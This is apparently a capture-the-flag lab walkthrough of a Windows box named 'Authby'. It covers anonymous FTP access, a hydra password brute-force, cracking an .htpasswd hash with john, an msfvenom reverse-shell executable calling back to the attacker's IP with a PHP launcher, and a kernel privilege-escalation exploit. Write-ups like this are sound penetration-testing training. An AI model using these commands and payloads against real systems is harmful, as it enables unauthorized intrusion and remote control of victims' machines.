#windows 
### Summary
We will initially exploit this machine through Anonymous FTP. After logging in as the anonymous FTP user, we will deduce the password of the admin FTP account. We'll then use this account to discover additional system credentials which we'll use to trigger our uploaded reverse shell. Finally, we'LL escalate with a local privilege escalation exploit.
## Enumeration
### Nmap
We'll begin with an `nmap` scan.
```
kali@kali:~$ sudo nmap -p- 192.168.68.46
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-27 17:32 UTC
Nmap scan report for 192.168.68.46
Host is up (0.031s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
242/tcp  open  direct
3145/tcp open  csi-lfap
3389/tcp open  ms-wbt-server
```
Next, we'll launch an aggressive scan against the discovered open ports.
The results indicate that the FTP server allows anonymous authentication. In addition, an Apache web server is running on port 242.
### FTP Enumeration
Since FTP appears to be wide-open, let's log in as the `anonymous` user and enumerate available files and directories.

```
kali@kali:~$ ftp 192.168.68.46
Connected to 192.168.68.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.68.46:kali): anonymous
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 9680
----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root           25 Feb 10  2011 UninstallService.bat
----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
----------   1 root     root           17 Aug 13  2011 StopService.bat
----------   1 root     root           18 Aug 13  2011 StartService.bat
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Dec 28 01:37 log
----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
----------   1 root     root           23 Feb 10  2011 InstallService.bat
dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
dr-xr-xr-x   1 root     root          512 Aug 13 04:13 accounts
226 Closing data connection.
ftp>
```

The **accounts** directory looks interesting and is worth exploring.

```
ftp> cd accounts
250 CWD Command successful.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 4
dr-xr-xr-x   1 root     root          512 Aug 13 04:13 backup
----------   1 root     root          764 Aug 13 04:13 acc[Offsec].uac
----------   1 root     root         1030 Dec 28 01:38 acc[anonymous].uac
----------   1 root     root          926 Aug 13 04:13 acc[admin].uac
226 Closing data connection.
ftp> exit
221 Goodbye.
kali@kali:~$
```
This directory contains a UAC account file for the `admin` user.
## Exploitation
### FTP User Login Brute-Force
Let's brute-force the `admin` account with `hydra` and the **rockyou.txt** wordlist.
```
kali@kali:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://192.168.68.46
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-27 17:43:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344402 login tries (l:1/p:14344402), ~896526 tries per task
[DATA] attacking ftp://192.168.68.46:21/
[21][ftp] host: 192.168.68.46   login: admin   password: admin
[STATUS] attack finished for 192.168.68.46 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-27 17:43:44
kali@kali:~$
```
This reveals that the password is `admin`.
### Further FTP Enumeration
We can now log in to FTP with the `admin:admin` credentials and enumerate further.
```
kali@kali:~$ ftp 192.168.68.46
Connected to 192.168.68.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.68.46:kali): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp>
```

Inside this user's directory, we find three files: **index.php**, **.htpasswd**, and **.htaccess**. Let's download them to our attack machine for closer inspection.
```
ftp> get index.php
local: index.php remote: index.php
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
76 bytes received in 0.10 secs (0.7232 kB/s)
ftp> get .htpasswd
local: .htpasswd remote: .htpasswd
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
45 bytes received in 0.11 secs (0.4185 kB/s)
ftp> get .htaccess
local: .htaccess remote: .htaccess
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
161 bytes received in 0.10 secs (1.5832 kB/s)
ftp> bye
221 Goodbye.
kali@kali:~$
```

The **index.php** file doesn't contain anything of value.
The **.htpasswd** file contains a password hash for the `offsec` user.
```
kali@kali:~$ cat .htpasswd 
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```
The **.htaccess** file indicates that the **.htpasswd** file is used for authentication.
```
kali@kali:~$ cat .htaccess
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>kali@kali:~$
```
This means that if we crack the hash, we can authenticate as the `offsec` user.
### Password Cracking
We can use `john` to attempt to crack the retrieved password hash.

```
kali@kali:~$ john .htpasswd --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
elite            (offsec)
1g 0:00:00:00 DONE (2020-12-27 17:56) 8.333g/s 211200p/s 211200c/s 211200C/s 191192..260989
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@kali:~$
```
We discover that the password for the `offsec` user is `elite`.

## Foothold
We created a reverse shell exe using msfvenom and a php file to run the exploit. Then we uploaded it through the ftp. 
```
┌──(venv)─(kali㉿kali)-[~/OffSecPractice/Authby]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.233 LPORT=443 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: revshell.exe

┌──(venv)─(kali㉿kali)-[~/OffSecPractice/Authby]
└─$ cat run.php           
<?php
$exec = system('revshell.exe', $val)
?>                                                                                                        
┌──(venv)─(kali㉿kali)-[~/OffSecPractice/Authby]
└─$ 

```

## Privilege Escalation
We run the windows exploit suggester with the systeminfo and it suggested multiple priv esc suggestion.
Upon trying couple of them this one worked https://www.exploit-db.com/exploits/40564
CVE-2011-1249 #kernel_exploit #windows
Followed the exploitation as suggested and we got the administrator access.